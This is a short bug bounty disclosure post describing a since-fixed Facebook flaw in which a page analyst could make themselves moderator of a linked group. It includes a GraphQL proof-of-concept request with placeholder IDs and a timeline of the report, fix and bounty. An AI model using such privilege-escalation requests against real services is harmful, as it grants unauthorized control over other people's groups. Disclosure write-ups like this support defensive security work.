---
layout: single
title:  "Facebook Bug Bounty: A page analyst could add themselves as the moderator on a group"
---

## Description
There is a call to add member as the moderator on a group. The call at the time didn’t seem to have any authorisation checks to page roles. A page analyst was possible to add oneself as a moderator on a linked group.

## Proof of Concept
```
HTTP POST

graph.facebook.com/graphql/

query_id=QUERYID

query_params={"0":{"user_id":"UserID","admin_type":"MODERATOR","actor_id":"PageID","client_mutation_id":"","source":"treehouse_group_mall","group_id":"GroupID"}}

```

## Timeline
- Dec 19, 2018 - Report Sent
- Dec 22, 2018 - Further investigation by Facebook
- Jan 9, 2019 - Fixed by Facebook
- Jan 11, 2019 - Bounty Awarded by Facebook

<iframe width="560" height="315" src="https://www.youtube.com/embed/1_BJu-nLFoM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
